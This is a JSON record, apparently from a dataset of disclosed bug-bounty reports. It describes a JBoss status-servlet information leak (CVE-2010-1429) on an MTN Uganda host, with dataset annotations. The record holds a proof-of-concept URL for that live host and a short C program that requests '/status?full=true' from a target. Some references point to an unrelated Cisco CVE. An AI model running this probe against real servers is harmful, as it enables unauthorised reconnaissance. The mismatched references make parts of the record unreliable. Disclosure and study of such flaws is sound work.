@@ -1,0 +1,38 @@
+{
+  "reported_to": "MTN Group",
+  "reported_by": "deb0con ",
+  "title": "CVE-2010-1429 JBoss Insecure Storage of Sensitive Information on ips.mtn.co.ug",
+  "content": "\nSummary:\nRed Hat JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.2 before 4.2.0.CP09 and 4.3 before 4.3.0.CP08 allows remote attackers to obtain sensitive information about \"deployed web contexts\" via a request to the status servlet, as demonstrated by a full=true query string. this issue exists because of a CVE-2008-3273 regression. by requesting the Status param and sitting its value to true, Jobss will print a sensitive information such as Memory used/Total Memory / Client IP address.\nProof of concept\nNavigate intercept / visit hostserver on https://h30f.n1.ips.mtn.co.ug/status?full=true\nYou can see on the page is sensitive has exposed\nBellow of vulnerable code\nCode 1.45 KiB\n1#include <stdio.h>\n2#include <string.h>\n3#include <stdlib.h>\n4#include <unistd.h>\n5#include <fcntl.h>\n6#include <netinet/tcp.h>\n7#include <sys/socket.h>\n8#include <sys/types.h>\n9#include <netinet/in.h>\n10#include <netdb.h>\n11 \n12 \n13int socket_connect(char *host, in_port_t port){\n14    struct hostent *hp;\n15    struct sockaddr_in addr;\n16    int on = 1, sock;\n17     \n18    if((hp = gethostbyname(host)) == NULL){\n19        herror(\"gethostbyname\");\n20        exit(1);\n21    }\n22    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);\n23    addr.sin_port = htons(port);\n24    addr.sin_family = AF_INET;\n25    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\n26    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));\n27     \n28    if(sock == -1){\n29        perror(\"setsockopt\");\n30        exit(1);\n31    }\n32     \n33    if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){\n34        perror(\"connect\");\n35        exit(1);\n36         \n37    }\n38    return sock;\n39}\n40 \n41- #define BUFFER_SIZE 1024\n42 \n43int main(int argc, char *argv[]){\n44    int fd;\n45    char buffer[BUFFER_SIZE];\n46     \n47    if(argc < 3){\n48-        fprintf(stderr, \"Usage: %s <hostname> <port>\\n\", argv[0]);\n49        exit(1);\n50    }\n51     \n52    fd = socket_connect(argv[1], atoi(argv[2]));\n53+    write(fd, \"GET /status?full=true\\r\\n\", strlen(\"GET /status?full=true\\r\\n\")); // write(fd, char[]*, len);\n54    while(read(fd, buffer, BUFFER_SIZE - 1) != 0){\n55         fprintf(stderr, \"%s\", buffer);\n56    }\n57 \n58    shutdown(fd, SHUT_RDWR);\n59    close(fd);\n60    return 0;\n61}\nSupporting Material/References:\nThe JBoss Enterprise Application Platform 4.2.0.CP03 and 4.3.0.CP01 updates for Red Hat Enterprise Linux 4 and 5 fixed an issue (CVE-2008-3273) where unauthenticated users were able to access the status servlet; however, a bug fix included in the 4.2.0.CP06 and 4.3.0.CP04 updates re-introduced the issue. A remote attacker could use this flaw to acquire details about deployed web contexts.\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-0296\nhttps://hackerone.com/reports/378698\nImpact\nRed Hat JBoss Enterprise Application Platform could allow a remote attacker to obtain sensitive information, caused by improper restrictions on the status servlet. An attacker could exploit this vulnerability to obtain details about deployed Web contexts and other sensitive information.\nhttps://github.com/advisories/GHSA-x26p-67q3-4mfx\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Insecure Storage of Sensitive Information"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1725049680,
+  "report_url": "https://hackerone.com/reports/2375659",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to or intercept the host server at https://h30f.n1.ips.mtn.co.ug/status?full=true"
+    ],
+    [
+      2,
+      "Observe the exposed sensitive information such as Memory used, Total Memory, and Client IP address in the response"
+    ]
+  ],
+  "vuln_description": "Red Hat JBoss Enterprise Application Platform (JBoss EAP) versions 4.2 before 4.2.0.CP09 and 4.3 before 4.3.0.CP08 allow remote attackers to obtain sensitive information about deployed web contexts via a request to the status servlet with the 'full=true' query string. This issue is a regression of CVE-2008-3273, where the status servlet was previously fixed but reintroduced in later updates.",
+  "reason": "The vulnerability is straightforward to exploit as it only requires accessing a specific URL with a known query parameter. There are no complex interactions or state manipulations involved, and the attack vector is well-documented and similar to other known vulnerabilities.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": "378698"
+}
